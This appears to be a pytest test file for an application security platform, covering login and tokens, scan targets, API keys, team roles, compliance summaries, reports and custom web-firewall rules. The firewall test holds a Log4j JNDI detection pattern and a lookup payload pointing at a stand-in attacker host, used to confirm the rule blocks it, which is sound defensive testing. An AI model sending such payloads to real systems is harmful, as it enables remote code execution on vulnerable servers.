import pytest
from httpx import AsyncClient, ASGITransport
from app.main import app
from app.db.session import init_db
from app.core.auth import create_access_token, decode_token, get_password_hash, verify_password
from app.governance.domain_verifier import DomainVerifier

@pytest.fixture(autouse=True)
def setup_database():
    init_db()

@pytest.mark.asyncio
async def test_auth_and_jwt():
    # Password hashing
    pwd = "EnterpriseTestSecret@2026"
    hashed = get_password_hash(pwd)
    assert verify_password(pwd, hashed)
    assert not verify_password("wrong_password", hashed)

    # JWT generation & decoding
    token = create_access_token({"sub": "42", "email": "test@enterprise.io", "role": "pentester"})
    decoded = decode_token(token)
    assert decoded is not None
    assert decoded["sub"] == "42"
    assert decoded["email"] == "test@enterprise.io"
    assert decoded["role"] == "pentester"

@pytest.mark.asyncio
async def test_auth_endpoints():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Demo login
        resp = await client.post("/api/auth/demo-login", json={"role": "admin"})
        assert resp.status_code == 200
        data = resp.json()
        assert "access_token" in data
        assert data["user"]["role"] == "admin"
        token = data["access_token"]

        # 2. Get me
        me_resp = await client.get("/api/auth/me", headers={"Authorization": f"Bearer {token}"})
        assert me_resp.status_code == 200
        me_data = me_resp.json()
        assert me_data["role"] == "admin"

@pytest.mark.asyncio
async def test_domain_verification_logic():
    token = DomainVerifier.generate_token()
    assert token.startswith("aegis-verify-")
    assert len(token) > 20

    # Local benchmark testbed auto-verify
    is_valid, msg = await DomainVerifier.verify_target("127.0.0.1:8000", "http://127.0.0.1:8000/api/shop", "HTTP_WELL_KNOWN", token)
    assert is_valid is True

@pytest.mark.asyncio
async def test_target_crud():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Register new target
        reg_resp = await client.post("/api/targets", json={
            "name": "Acme Production Gateway",
            "domain": "acme-corp.internal",
            "base_url": "http://127.0.0.1:8000/api/shop",
            "verification_method": "HTTP_WELL_KNOWN"
        })
        assert reg_resp.status_code == 200
        target_data = reg_resp.json()["target"]
        target_id = target_data["id"]
        assert target_data["name"] == "Acme Production Gateway"
        assert target_data["is_verified"] is False

        # List targets
        list_resp = await client.get("/api/targets")
        assert list_resp.status_code == 200
        targets = list_resp.json()
        assert any(t["id"] == target_id for t in targets)

        # Delete target
        del_resp = await client.delete(f"/api/targets/{target_id}")
        assert del_resp.status_code == 200

@pytest.mark.asyncio
async def test_api_keys_and_webhooks():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Generate API key
        key_resp = await client.post("/api/keys", json={
            "name": "Jenkins Staging Runner",
            "role": "ci_cd_runner"
        })
        assert key_resp.status_code == 200
        key_data = key_resp.json()
        assert key_data["api_key"].startswith("aegis_live_")
        key_id = key_data["key_id"]

        # List keys
        list_resp = await client.get("/api/keys")
        assert list_resp.status_code == 200
        assert any(k["id"] == key_id for k in list_resp.json())

        # Revoke key
        del_resp = await client.delete(f"/api/keys/{key_id}")
        assert del_resp.status_code == 200

@pytest.mark.asyncio
async def test_compliance_summary():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        resp = await client.get("/api/compliance/summary")
        assert resp.status_code == 200
        data = resp.json()
        assert "overall_score_percentage" in data
        assert "owasp_top_10" in data
        assert "pci_dss_4_0" in data

@pytest.mark.asyncio
async def test_team_and_rbac():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Get members
        members_resp = await client.get("/api/team/members")
        assert members_resp.status_code == 200
        assert members_resp.json()["count"] >= 3

        # 2. Get RBAC matrix
        roles_resp = await client.get("/api/team/roles")
        assert roles_resp.status_code == 200
        roles = roles_resp.json()["roles"]
        assert any(r["id"] == "admin" for r in roles)
        assert any(r["id"] == "pentester" for r in roles)

        # 3. Invite member
        invite_resp = await client.post("/api/team/members", json={
            "name": "Marcus Kane",
            "email": "marcus.kane@securityops.org",
            "role": "pentester"
        })
        assert invite_resp.status_code == 200
        invited_id = invite_resp.json()["member"]["id"]

        # 4. Remove member
        del_resp = await client.delete(f"/api/team/members/{invited_id}")
        assert del_resp.status_code == 200

@pytest.mark.asyncio
async def test_waf_custom_virtual_patches():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. List default virtual patch rules
        list_resp = await client.get("/api/waf/custom-rules")
        assert list_resp.status_code == 200
        rules = list_resp.json()
        assert len(rules) >= 3

        # 2. Create a virtual patch
        new_rule_resp = await client.post("/api/waf/custom-rules", json={
            "name": "Zero-Day Log4j JNDI Mitigation",
            "pattern": r"(?i)\$\{\s*(jndi|ldap|rmi)\s*:",
            "action": "BLOCK",
            "description": "Immediate block of outbound JNDI lookups."
        })
        assert new_rule_resp.status_code == 200
        rule_id = new_rule_resp.json()["rule"]["id"]

        # 3. Test payload against virtual patch
        test_resp = await client.post("/api/waf/custom-rules/test", json={
            "payload": "${jndi:ldap://evil-corp.attacker.com/exploit}"
        })
        assert test_resp.status_code == 200
        test_data = test_resp.json()
        assert test_data["is_blocked"] is True
        assert test_data["match_count"] >= 1

        # 4. Toggle rule
        toggle_resp = await client.patch(f"/api/waf/custom-rules/{rule_id}/toggle")
        assert toggle_resp.status_code == 200
        assert toggle_resp.json()["is_active"] is False

        # 5. Delete rule
        del_resp = await client.delete(f"/api/waf/custom-rules/{rule_id}")
        assert del_resp.status_code == 200

@pytest.mark.asyncio
async def test_report_exports():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Preview
        prev_resp = await client.get("/api/reports/preview")
        assert prev_resp.status_code == 200

        # Markdown
        md_resp = await client.get("/api/reports/export/markdown")
        assert md_resp.status_code == 200
        assert "AegisAppSec // Executive Security Audit Report" in md_resp.text

        # CSV
        csv_resp = await client.get("/api/reports/export/csv")
        assert csv_resp.status_code == 200
        assert "ID,Title,Severity,CVSS_Score" in csv_resp.text
